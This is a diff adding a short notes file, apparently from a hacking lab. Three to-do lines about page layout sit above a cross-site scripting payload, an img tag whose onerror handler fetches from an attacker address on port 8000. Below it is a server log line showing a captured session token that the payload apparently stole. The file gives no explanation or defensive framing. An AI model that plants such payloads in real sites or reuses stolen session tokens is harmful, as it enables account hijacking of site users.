@@ -1,0 +1,15 @@
+Fix the height of the images in /posts when zooming in
+
+Fix the text size when using phones
+
+Fix the alignment of posts when zooming in in /posts
+
+
+<img src=x onerror=fetch("http://10.10.14.142:8000/");>
+
+10.10.11.12 - - [18/May/2024 23:19:47] "GET /session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zkgk-g.MbTH2-kmGMEb5ikxNfM305U1wZU HTTP/1.1" 404 -
+
+
+
+
+
